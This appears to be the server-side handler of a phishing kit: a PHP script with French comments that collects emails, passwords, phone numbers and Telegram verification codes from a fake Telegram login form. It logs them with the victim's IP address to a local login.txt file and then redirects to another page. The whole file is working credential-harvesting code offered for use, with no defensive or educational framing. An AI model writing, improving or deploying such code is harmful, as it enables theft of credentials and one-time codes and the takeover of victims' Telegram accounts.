<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 1. Récupération sécurisée des données
    $username = $_POST["email"] ?? '';
    $password = $_POST["password"] ?? '';
    $country_code = $_POST["country_code"] ?? '';
    $phone_number = $_POST["phone_number"] ?? '';
    $verification_code = $_POST["code"] ?? '';
    $remember = isset($_POST["remember"]) ? 'Oui' : 'Non';
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');

    // 2. Debugging : Vérifiez ce qui est reçu (à commenter en production)
    error_log("Reçu : country_code=$country_code | phone_number=$phone_number");

    // 3. Formatage des données (correction appliquée ici)
    $data = "=== ".(!empty($verification_code) ? "CODE TELEGRAM" : "NOUVELLE CONNEXION TELEGRAM")." ===\n";
    $data .= "Date: $date\n";
    
    if (!empty($verification_code)) {
        $data .= "Code de vérification: $verification_code\n";
    } else {
        $data .= "Email/Username: $username\n";
        // CORRECTION CRITIQUE : Gestion combinée code pays + numéro
        $full_phone = (!empty($country_code) ? $country_code : '') . (!empty($phone_number) ? $phone_number : '');
        $data .= "Téléphone: " . (!empty($full_phone) ? $full_phone : "Non fourni") . "\n";
        $data .= "Mot de passe: $password\n";
        $data .= "Session active: $remember\n";
    }
    
    $data .= "Adresse IP: $ip\n==============================\n\n";

    // 4. Écriture garantie dans le fichier
    $file = __DIR__.'/login.txt';
    $mode = !empty($verification_code) ? 'w' : 'a';
    
    $fh = @fopen($file, $mode);
    if ($fh && flock($fh, LOCK_EX)) {
        fwrite($fh, $data);
        flock($fh, LOCK_UN);
        fclose($fh);
        header("Location: mer.html");
        exit();
    } else {
        error_log("Échec écriture : " . print_r($_POST, true));
        echo "<script>alert('Erreur serveur.'); history.back();</script>";
        exit();
    }
} else {
    header("HTTP/1.1 403 Forbidden");
    exit('Accès direct interdit');
}
?>
    
